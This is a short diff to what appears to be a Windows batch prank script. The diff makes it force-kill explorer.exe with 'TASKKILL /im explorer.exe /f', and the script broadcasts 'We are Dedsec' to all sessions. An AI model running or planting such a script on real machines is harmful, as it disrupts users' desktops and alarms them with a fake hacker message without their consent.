@@ -1,4 +1,4 @@
-TASKKILL /im explorer.exe
+TASKKILL /im explorer.exe /f
 
 msg * We are Dedsec 
 
